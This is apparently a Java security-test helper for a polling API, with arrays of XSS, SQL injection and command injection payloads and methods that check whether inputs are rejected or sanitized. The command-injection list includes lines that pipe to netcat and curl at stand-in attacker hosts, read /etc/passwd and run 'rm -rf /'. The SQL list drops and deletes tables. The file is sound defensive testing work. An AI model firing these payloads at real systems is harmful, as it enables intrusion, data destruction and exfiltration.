package com.amalitech.qa.utils;

import io.qameta.allure.Step;
import io.restassured.response.Response;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Utility class for security testing.
 * Provides methods for validating input sanitization and injection prevention.
 * 
 * @author QuickPoll API Testing Framework
 * @version 1.0.0
 */
public class SecurityTestHelper {
    private static final Logger logger = LoggerFactory.getLogger(SecurityTestHelper.class);
    
    /**
     * Common XSS (Cross-Site Scripting) payloads for testing.
     */
    public static final String[] XSS_PAYLOADS = {
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<svg onload=alert('XSS')>",
        "<iframe src='javascript:alert(\"XSS\")'></iframe>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "'\"><script>alert('XSS')</script>"
    };
    
    /**
     * Common SQL injection payloads for testing.
     */
    public static final String[] SQL_INJECTION_PAYLOADS = {
        "' OR '1'='1",
        "'; DROP TABLE users--",
        "1' UNION SELECT NULL--",
        "admin'--",
        "' OR 1=1--",
        "1' AND '1'='1",
        "' UNION SELECT * FROM users--",
        "1; DELETE FROM polls WHERE '1'='1"
    };
    
    /**
     * Common command injection payloads for testing.
     */
    public static final String[] COMMAND_INJECTION_PAYLOADS = {
        "; ls -la",
        "| cat /etc/passwd",
        "&& whoami",
        "`id`",
        "$(whoami)",
        "; rm -rf /",
        "| nc attacker.com 4444",
        "&& curl http://malicious.com"
    };
    
    /**
     * Private constructor to prevent instantiation.
     */
    private SecurityTestHelper() {
        throw new UnsupportedOperationException("Utility class cannot be instantiated");
    }
    
    /**
     * Validates that malicious input is either rejected or sanitized.
     * 
     * The API should handle malicious input in one of two ways:
     * 1. Reject the input with HTTP 400 Bad Request
     * 2. Accept the input with HTTP 200/201 but sanitize it so malicious content doesn't appear in the response
     * 
     * @param response the API response
     * @param payload the malicious payload that was sent
     * @param fieldName the field where the payload was sent
     * @throws AssertionError if the API neither rejects nor sanitizes the input
     */
    @Step("Validate input sanitization for field '{fieldName}' with payload: {payload}")
    public static void validateInputSanitization(Response response, String payload, String fieldName) {
        int statusCode = response.getStatusCode();
        String responseBody = response.getBody().asString();
        
        logger.debug("Validating input sanitization for field '{}' with payload: {}", fieldName, payload);
        logger.debug("Response status: {}, body: {}", statusCode, responseBody);
        
        // Option 1: API rejects malicious input with 400 Bad Request
        if (statusCode == 400) {
            logger.info("API correctly rejected malicious input with 400 Bad Request");
            // Verify error message is present
            assertNotNull(response.jsonPath().getString("message"), 
                "Error response should contain a message field");
            return;
        }
        
        // Option 2: API accepts input but should sanitize it
        if (statusCode == 200 || statusCode == 201) {
            logger.debug("API accepted input with status {}, verifying sanitization", statusCode);
            
            // Check if the dangerous payload appears unsanitized in the response
            boolean containsUnsanitizedPayload = responseBody.contains(payload);
            
            if (containsUnsanitizedPayload) {
                // Check if it's actually sanitized (e.g., HTML encoded)
                boolean isSanitized = isContentSanitized(response, payload);
                
                if (!isSanitized) {
                    fail(String.format(
                        "Security vulnerability detected!%n" +
                        "Field: %s%n" +
                        "Malicious payload: %s%n" +
                        "Status code: %d%n" +
                        "The API accepted the malicious input and returned it unsanitized in the response.%n" +
                        "Response body: %s",
                        fieldName, payload, statusCode, responseBody
                    ));
                } else {
                    logger.info("API accepted input but properly sanitized it");
                }
            } else {
                logger.info("API accepted input and payload does not appear in response (likely filtered)");
            }
            return;
        }
        
        // Unexpected status code
        fail(String.format(
            "Unexpected status code %d for malicious input.%n" +
            "Expected: 400 (rejected) or 200/201 (accepted and sanitized)%n" +
            "Field: %s%n" +
            "Payload: %s%n" +
            "Response: %s",
            statusCode, fieldName, payload, responseBody
        ));
    }
    
    /**
     * Checks if response body contains unsanitized malicious content.
     * 
     * @param response the API response
     * @param dangerousPatterns patterns to check for (e.g., script tags, SQL keywords)
     * @return true if content appears to be sanitized, false if dangerous patterns are found
     */
    public static boolean isContentSanitized(Response response, String... dangerousPatterns) {
        String responseBody = response.getBody().asString();
        String lowerCaseBody = responseBody.toLowerCase();
        
        for (String pattern : dangerousPatterns) {
            String lowerPattern = pattern.toLowerCase();
            
            // Check for exact match (unsanitized)
            if (responseBody.contains(pattern)) {
                // Check if it's HTML encoded or otherwise sanitized
                String htmlEncoded = htmlEncode(pattern);
                if (responseBody.contains(htmlEncoded)) {
                    logger.debug("Pattern '{}' found but appears to be HTML encoded", pattern);
                    continue; // This is sanitized
                }
                
                // Check for common XSS patterns
                if (lowerPattern.contains("<script") && lowerCaseBody.contains("<script")) {
                    logger.warn("Unsanitized <script> tag found in response");
                    return false;
                }
                
                if (lowerPattern.contains("onerror") && lowerCaseBody.contains("onerror")) {
                    logger.warn("Unsanitized onerror attribute found in response");
                    return false;
                }
                
                if (lowerPattern.contains("javascript:") && lowerCaseBody.contains("javascript:")) {
                    logger.warn("Unsanitized javascript: protocol found in response");
                    return false;
                }
                
                // Check for SQL injection patterns
                if (lowerPattern.contains("drop table") && lowerCaseBody.contains("drop table")) {
                    logger.warn("Unsanitized SQL DROP statement found in response");
                    return false;
                }
                
                if (lowerPattern.contains("union select") && lowerCaseBody.contains("union select")) {
                    logger.warn("Unsanitized SQL UNION statement found in response");
                    return false;
                }
                
                // Check for command injection patterns
                if (pattern.matches(".*[;&|`$].*") && responseBody.contains(pattern)) {
                    logger.warn("Unsanitized command injection characters found in response");
                    return false;
                }
            }
        }
        
        logger.debug("Content appears to be sanitized");
        return true;
    }
    
    /**
     * HTML encodes a string (basic encoding for common characters).
     * 
     * @param input the string to encode
     * @return HTML encoded string
     */
    private static String htmlEncode(String input) {
        return input
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
            .replace("\"", "&quot;")
            .replace("'", "&#x27;")
            .replace("/", "&#x2F;");
    }
    
    /**
     * Validates that XSS payload is properly handled.
     * Convenience method that calls validateInputSanitization with XSS-specific logging.
     * 
     * @param response the API response
     * @param xssPayload the XSS payload that was sent
     * @param fieldName the field where the payload was sent
     */
    @Step("Validate XSS protection for field '{fieldName}'")
    public static void validateXssProtection(Response response, String xssPayload, String fieldName) {
        logger.info("Testing XSS protection for field: {}", fieldName);
        validateInputSanitization(response, xssPayload, fieldName);
    }
    
    /**
     * Validates that SQL injection payload is properly handled.
     * Convenience method that calls validateInputSanitization with SQL-specific logging.
     * 
     * @param response the API response
     * @param sqlPayload the SQL injection payload that was sent
     * @param fieldName the field where the payload was sent
     */
    @Step("Validate SQL injection protection for field '{fieldName}'")
    public static void validateSqlInjectionProtection(Response response, String sqlPayload, String fieldName) {
        logger.info("Testing SQL injection protection for field: {}", fieldName);
        validateInputSanitization(response, sqlPayload, fieldName);
    }
    
    /**
     * Validates that command injection payload is properly handled.
     * Convenience method that calls validateInputSanitization with command injection-specific logging.
     * 
     * @param response the API response
     * @param commandPayload the command injection payload that was sent
     * @param fieldName the field where the payload was sent
     */
    @Step("Validate command injection protection for field '{fieldName}'")
    public static void validateCommandInjectionProtection(Response response, String commandPayload, String fieldName) {
        logger.info("Testing command injection protection for field: {}", fieldName);
        validateInputSanitization(response, commandPayload, fieldName);
    }
    
    /**
     * Checks if an error response indicates input validation failure.
     * 
     * @param response the API response
     * @return true if the response indicates validation failure
     */
    public static boolean isValidationError(Response response) {
        if (response.getStatusCode() != 400) {
            return false;
        }
        
        String message = response.jsonPath().getString("message");
        if (message == null) {
            return false;
        }
        
        String lowerMessage = message.toLowerCase();
        return lowerMessage.contains("validation") || 
               lowerMessage.contains("invalid") || 
               lowerMessage.contains("required") ||
               lowerMessage.contains("malicious") ||
               lowerMessage.contains("not allowed");
    }
}
